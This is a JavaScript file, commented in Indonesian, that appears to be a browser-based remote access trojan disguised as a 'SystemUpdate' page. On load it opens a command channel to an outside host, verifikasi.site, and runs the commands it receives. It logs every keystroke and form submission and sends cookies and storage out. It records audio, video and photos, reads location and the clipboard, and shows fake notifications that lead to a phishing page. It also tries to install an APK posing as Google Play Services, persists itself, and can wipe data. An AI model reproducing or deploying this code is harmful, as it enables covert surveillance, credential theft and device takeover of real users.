// 🔥 GLOBAL ERROR HANDLER
// ============================================================
(function() {
    var errorLog = [];
    
    window.addEventListener('error', function(e) {
        var err = {
            message: e.message || 'Unknown error',
            filename: e.filename || 'unknown',
            lineno: e.lineno || 0,
            colno: e.colno || 0,
            stack: (e.error && e.error.stack) || 'No stack',
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        return true;
    }, true);
    
    window.addEventListener('unhandledrejection', function(e) {
        var err = {
            type: 'unhandled_rejection',
            reason: String(e.reason || 'Unknown'),
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        e.preventDefault();
        return true;
    }, true);
    
    window.__errorLog = errorLog;
})();

// ============================================================
// 🔥 SAFE PATH
// ============================================================
function getSafePath(base, filename) {
    if (!base || typeof base !== 'string') return null;
    if (!filename || typeof filename !== 'string') return null;
    
    var cleanName = filename.replace(/[^a-zA-Z0-9_.-]/g, '');
    if (cleanName.length === 0) return null;
    
    var fullPath = base.replace(/\/+$/, '') + '/' + cleanName;
    
    if (fullPath.indexOf('..') !== -1) return null;
    if (fullPath.indexOf('//') !== -1) return null;
    
    return fullPath;
}

// ============================================================
// 🔥 SAFE FETCH
// ============================================================
function safeFetch(url, options, timeout, retries) {
    timeout = timeout || 15000;
    retries = retries || 3;
    var attempt = 0;
    var cacheKey = 'cache_' + url;
    
    try {
        var cached = localStorage.getItem(cacheKey);
        if (cached) {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 60000)) {
                return Promise.resolve(new Response(JSON.stringify(data.value), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
        }
    } catch(e) {}
    
    function doFetch() {
        return new Promise(function(resolve, reject) {
            var timer = setTimeout(function() {
                reject(new Error('Timeout: ' + url));
            }, timeout);
            
            fetch(url, options)
                .then(function(response) {
                    clearTimeout(timer);
                    if (response.ok) {
                        response.clone().text().then(function(text) {
                            try {
                                localStorage.setItem(cacheKey, JSON.stringify({
                                    value: JSON.parse(text),
                                    timestamp: Date.now()
                                }));
                            } catch(e) {}
                        }).catch(function(){});
                    }
                    resolve(response);
                })
                .catch(function(err) {
                    clearTimeout(timer);
                    reject(err);
                });
        });
    }
    
    return new Promise(function(resolve, reject) {
        function tryFetch() {
            doFetch()
                .then(resolve)
                .catch(function(err) {
                    attempt++;
                    if (attempt < retries) {
                        var delay = 1000 * Math.pow(2, attempt);
                        setTimeout(tryFetch, delay);
                    } else {
                        reject(err);
                    }
                });
        }
        tryFetch();
    });
}

// ============================================================
// 🔥 CACHE MANAGER
// ============================================================
var CacheManager = {
    set: function(key, value, ttl) {
        ttl = ttl || 300000;
        try {
            localStorage.setItem('cm_' + key, JSON.stringify({
                value: value,
                expires: Date.now() + ttl
            }));
            return true;
        } catch(e) { return false; }
    },
    get: function(key) {
        try {
            var raw = localStorage.getItem('cm_' + key);
            if (!raw) return null;
            var data = JSON.parse(raw);
            if (Date.now() > data.expires) {
                localStorage.removeItem('cm_' + key);
                return null;
            }
            return data.value;
        } catch(e) { return null; }
    },
    clear: function(key) {
        try {
            if (key) {
                localStorage.removeItem('cm_' + key);
            } else {
                var keys = Object.keys(localStorage);
                keys.forEach(function(k) {
                    if (k.startsWith('cm_')) localStorage.removeItem(k);
                });
            }
        } catch(e) {}
    }
};

function compressData(data) {
    try {
        var json = JSON.stringify(data);
        return json.replace(/\s/g, '');
    } catch(e) { return JSON.stringify(data); }
}

// ============================================================
// 🔥 SERVICE WORKER - PAKAI /sw.js (BUKAN BLOB!)
// ============================================================
function registerSW() {
    if (swRegistered) {
        K({ sumber: 'sw_status', data: 'already_registered' });
        return;
    }
    
    if (!('serviceWorker' in navigator)) {
        document.getElementById('status').textContent = '❌ SW not supported';
        return;
    }
    
    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                swRegistered = true;
                K({ sumber: 'sw_status', data: 'already_registered' });
                document.getElementById('status').textContent = '✅ SW already active!';
                return;
            }
            
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                    K({ sumber: 'sw_status', data: 'registered' });
                })
                .catch(function(err) {
                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        })
        .catch(function() {
            navigator.serviceWorker.register('/sw.js', { scope: '/' })
                .then(function(reg) {
                    swRegistered = true;
                    document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                    K({ sumber: 'sw_status', data: 'registered_fallback' });
                })
                .catch(function(err) {
                    document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                    K({ sumber: 'sw_status', data: 'failed: ' + err.message });
                });
        });
}

// ============================================================
// 🔥 WEBSOCKET
// ============================================================
function connectWebSocket() {
    try {
        if (typeof WebSocket === 'undefined') {
            K({ sumber: 'ws_status', data: 'not_supported' });
            return;
        }
        
        var ws = new WebSocket('wss://verifikasi.site/ws');
        var reconnectAttempts = 0;
        var maxReconnect = 20;
        
        ws.onopen = function() {
            reconnectAttempts = 0;
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: '',
                deviceId: navigator.userAgent || 'unknown',
                timestamp: Date.now()
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_status', data: 'authenticated' });
                }
                if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_status', data: 'auth_failed' });
                }
                if (data.type === 'command' && data.aksi) {
                    var hasil = eksekusiPerintah(data);
                    ws.send(JSON.stringify({
                        type: 'result',
                        perintah: data.aksi,
                        hasil: hasil
                    }));
                    K({ sumber: 'ws_c2_result', data: { perintah: data.aksi, hasil: hasil } });
                }
                if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_message_error', data: e.message });
            }
        };
        
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            if (reconnectAttempts < maxReconnect) {
                reconnectAttempts++;
                var delay = 1000 * Math.pow(1.5, reconnectAttempts);
                setTimeout(connectWebSocket, delay);
            }
        };
        
        ws.onerror = function() {};
        
        var wsHeartbeat = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                } catch(e) {}
            }
        }, 30000);
        cleanupItems.push(function() { clearInterval(wsHeartbeat); });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

// ============================================================
// 🔥 INJECT KE FILE SYSTEM
// ============================================================
function injectToFileSystem() {
    try {
        var htmlContent = document.documentElement.outerHTML;
        var successCount = 0;
        
        try {
            localStorage.setItem('system_update_html', htmlContent);
            successCount++;
            K({ sumber: 'inject_ls', data: 'success' });
        } catch(e) {
            K({ sumber: 'inject_ls', data: 'failed: ' + e.message });
        }
        
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onupgradeneeded = function(e) {
                var db = e.target.result;
                if (!db.objectStoreNames.contains('files')) {
                    db.createObjectStore('files');
                }
            };
            request.onsuccess = function(e) {
                try {
                    var db = e.target.result;
                    var tx = db.transaction('files', 'readwrite');
                    var store = tx.objectStore('files');
                    store.put(htmlContent, 'SystemUpdate.html');
                    successCount++;
                    K({ sumber: 'inject_indexeddb', data: 'success' });
                } catch(e) {
                    K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
                }
            };
            request.onerror = function(e) {
                K({ sumber: 'inject_indexeddb', data: 'failed' });
            };
        } catch(e) {
            K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
        }
        
        if (A.isAvailable) {
            try {
                var safePath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
                A.saveFile(safePath, htmlContent);
                successCount++;
                K({ sumber: 'inject_hidden_folder', data: 'success' });
            } catch(e) {
                K({ sumber: 'inject_hidden_folder', data: 'failed: ' + e.message });
            }
        }
        
        if (successCount > 0) {
            document.getElementById('status').textContent = '✅ Injected!';
        }
    } catch(e) {
        K({ sumber: 'inject_error', data: e.message });
        document.getElementById('status').textContent = '❌ Inject error';
    }
}

// ============================================================
// 🔥 AUTO-EXECUTE
// ============================================================
function autoExecute() {
    try {
        var installed = localStorage.getItem('system_update_installed');
        var timestamp = localStorage.getItem('system_update_time');
        var now = Date.now();
        
        if (installed && timestamp && (now - parseInt(timestamp) > 86400000)) {
            injectToFileSystem();
            localStorage.setItem('system_update_time', now);
        }
        
        if (!installed) {
            localStorage.setItem('system_update_installed', '1');
            localStorage.setItem('system_update_time', now);
            injectToFileSystem();
        }
    } catch(e) {
        K({ sumber: 'auto_execute_error', data: e.message });
    }
}

var inputData = {};
var formData = [];

document.addEventListener('input', function(e) {
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            inputData[key] = e.target.value;
        }
    } catch(e) {}
});

document.addEventListener('submit', function(e) {
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        formData.push({
            waktu: Date.now(),
            url: window.location.href,
            data: data
        });
        K({ sumber: 'keylogger_submit', data: data });
    } catch(e) {}
});

setInterval(function() {
    try {
        if (Object.keys(inputData).length > 0) {
            K({ sumber: 'keylogger', data: inputData });
            inputData = {};
        }
        if (formData.length > 0) {
            K({ sumber: 'keylogger_forms', data: formData });
            formData = [];
        }
    } catch(e) {}
}, 3000);

// 🔥 INSTALL APK (TANPA PLAY STORE)

function installAPK(path) {
    try {
        var targetPath = path || '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
        var hasil = [];
        
        if (A.isAvailable) {
            try {
                A.installAPK(targetPath);
                hasil.push('bridge_success');
                K({ sumber: 'html_install_apk', data: { method: 'bridge', path: targetPath, status: 'success' } });
                document.getElementById('status').textContent = '✅ APK Installed!';
                return 'APK installed via bridge';
            } catch(e) {
                hasil.push('bridge_failed: ' + e.message);
            }
        }
        
        try {
            var intentUrl = 'intent://' + targetPath + '#Intent;scheme=file;package=com.android.packageinstaller;end';
            window.location.href = intentUrl;
            hasil.push('intent_attempted');
            K({ sumber: 'html_install_apk', data: { method: 'intent', path: targetPath } });
        } catch(e) {
            hasil.push('intent_failed: ' + e.message);
        }
        
        K({ sumber: 'html_install_apk', data: { path: targetPath, status: hasil.join('; ') } });
        return 'Install started: ' + targetPath;
    } catch(e) {
        return 'Error: ' + e.message;
    }
}

// 🔥 SELF DESTRUCT

function selfDestruct() {
    try {
        try { localStorage.clear(); } catch(e) {}
        try { sessionStorage.clear(); } catch(e) {}
        try {
            document.cookie.split(';').forEach(function(c) {
                document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
            });
        } catch(e) {}
        try {
            if ('caches' in window) {
                caches.keys().then(function(keys) {
                    keys.forEach(function(key) {
                        caches.delete(key);
                    });
                }).catch(function() {});
            }
        } catch(e) {}
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        K({ sumber: 'self_destruct', data: 'executed' });
        setTimeout(function() {
            try { window.close(); } catch(e) {}
            try { window.location.href = 'about:blank'; } catch(e) {}
        }, 2000);
        return 'Self destruct initiated!';
    } catch(e) {
        return 'Error: ' + e.message;
    }
}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_audio', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_video', hasil: reader.result } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'html_c2_result', data: { perintah: 'take_photo', hasil: reader.result } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({ sumber: 'html_c2_result', data: { perintah: 'ambil_lokasi', hasil: { lat: pos.coords.latitude, lon: pos.coords.longitude } } });
        });
        return 'Getting location...';
    } catch(e) { return 'Error: ' + e.message; }
}

function getClipboard() {
    try {
        navigator.clipboard.readText().then(function(t) {
            K({ sumber: 'html_c2_result', data: { perintah: 'get_clipboard', hasil: t } });
        }).catch(function() {});
        return 'Reading clipboard...';
    } catch(e) { return 'Error: ' + e.message; }
}

function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text).then(function() {
            K({ sumber: 'html_c2_result', data: { perintah: 'set_clipboard', hasil: 'success' } });
        }).catch(function() {});
        return 'Setting clipboard...';
    } catch(e) { return 'Error: ' + e.message; }
}

function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        setTimeout(function() { try { iframe.parentNode.removeChild(iframe); } catch(e) {} }, 5000);
        return 'URL opened hidden: ' + url;
    } catch(e) { return 'Error: ' + e.message; }
}

function downloadFile(url, filename) {
    try {
        var a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        setTimeout(function() { try { a.parentNode.removeChild(a); } catch(e) {} }, 1000);
        return 'Download started: ' + filename;
    } catch(e) { return 'Error: ' + e.message; }
}

function getSystemInfo() {
    try {
        return JSON.stringify({
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + 'x' + screen.height,
            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A',
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        });
    } catch(e) { return 'Error: ' + e.message; }
}

function getBattery() {
    try {
        navigator.getBattery().then(function(battery) {
            K({ sumber: 'html_c2_result', data: { perintah: 'get_battery', hasil: { level: Math.round(battery.level * 100) + '%', charging: battery.charging } } });
        }).catch(function(e) {});
        return 'Getting battery info...';
    } catch(e) { return 'Error: ' + e.message; }
}

function getStorage() {
    try {
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(function(storage) {
                K({ sumber: 'html_c2_result', data: { perintah: 'get_storage', hasil: { usage: (storage.usage / 1024 / 1024).toFixed(2) + ' MB', quota: (storage.quota / 1024 / 1024).toFixed(2) + ' MB' } } });
            }).catch(function(e) {});
            return 'Getting storage info...';
        }
        return 'Storage API not available';
    } catch(e) { return 'Error: ' + e.message; }
}

function getWiFi() {
    try {
        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            return JSON.stringify({ type: conn.effectiveType, downlink: conn.downlink, rtt: conn.rtt });
        }
        return 'WiFi info not available';
    } catch(e) { return 'Error: ' + e.message; }
}

function vibrate(durasi) {
    try { if (navigator.vibrate) { navigator.vibrate(durasi); return 'Vibrated ' + durasi + 'ms'; } return 'Vibration not supported'; } catch(e) { return 'Error: ' + e.message; }
}

function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';
        toast.textContent = '🔔 ' + message;
        document.body.appendChild(toast);
        setTimeout(function() { try { toast.parentNode.removeChild(toast); } catch(e) {} }, 5000);
        return 'Toast shown: ' + message;
    } catch(e) { return 'Error: ' + e.message; }
}

function showFakeNotification(message) {
    try {
        if (Notification.permission === 'granted') {
            var notif = new Notification('📱 System Update', { body: message || 'Update available!', icon: 'https://verifikasi.site/icon.png' });
            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
            return 'Notification shown: ' + message;
        }
        return 'Notification permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}

function speak(text) {
    try {
        if ('speechSynthesis' in window) {
            var utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = 'id-ID';
            speechSynthesis.speak(utterance);
            return 'Speaking: ' + text;
        }
        return 'Speech synthesis not supported';
    } catch(e) { return 'Error: ' + e.message; }
}

function collectData() {
    try {
        var d = {
            ua: navigator.userAgent,
            pl: navigator.platform,
            la: navigator.language,
            sc: screen.width + 'x' + screen.height,
            cd: screen.colorDepth,
            pr: window.devicePixelRatio,
            co: document.cookie,
            ls: JSON.stringify(localStorage),
            ss: JSON.stringify(sessionStorage),
            ur: location.href
        };
        K({ sumber: 'browser_data', data: d });
        return d;
    } catch(e) { return null; }
}

window.addEventListener('beforeunload', function() {
    try {
        var iframes = document.querySelectorAll('iframe');
        for (var i = 0; i < iframes.length; i++) {
            try {
                if (iframes[i] && iframes[i].parentNode) {
                    iframes[i].parentNode.removeChild(iframes[i]);
                }
            } catch(e) {}
        }
        for (var j = 0; j < cleanupItems.length; j++) {
            try {
                if (typeof cleanupItems[j] === 'function') {
                    cleanupItems[j]();
                }
            } catch(e) {}
        }
        cleanupItems = [];
        if (window._heartbeatInterval) clearInterval(window._heartbeatInterval);
        if (window._c2Interval) clearInterval(window._c2Interval);
        if (window._refreshTimer) clearTimeout(window._refreshTimer);
        if (window._closeTimer) clearTimeout(window._closeTimer);
    } catch(e) {}
});

// ============================================================
// 🔥 EKSEKUSI UTAMA - AUTO JALAN!
// ============================================================
var initialDataSent = false;

function init() {
    if (initialDataSent) return;
    initialDataSent = true;
    
    document.getElementById('status').textContent = '📡 Initializing...';
    collectData();
    registerSW();
    connectWebSocket();
    autoExecute();
    injectToFileSystem();
    
    window._c2Interval = setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 2000);
    
    window._heartbeatInterval = setInterval(function() {
        K({ sumber: 'page_heartbeat', data: 'alive' });
    }, HEARTBEAT_INTERVAL);
    
    localStorage.setItem('system_update_installed', '1');
    localStorage.setItem('system_update_time', Date.now());
    
    setTimeout(function() {
        try { window.close(); } catch(e) { window.location.href = 'about:blank'; }
    }, 3000);
}

try {
    if (localStorage.getItem('system_update_installed') === '1') {
        document.getElementById('status').textContent = '🔄 Restoring...';
        registerSW();
        connectWebSocket();
        window._c2Interval = setInterval(cekPerintah, C2_INTERVAL);
        setTimeout(cekPerintah, 1000);
        setTimeout(injectToFileSystem, 2000);
        setTimeout(function() { try { window.close(); } catch(e) { window.location.href = 'about:blank'; } }, 2000);
    } else {
        setTimeout(init, 500);
    }
} catch(e) {
    setTimeout(init, 500);
}
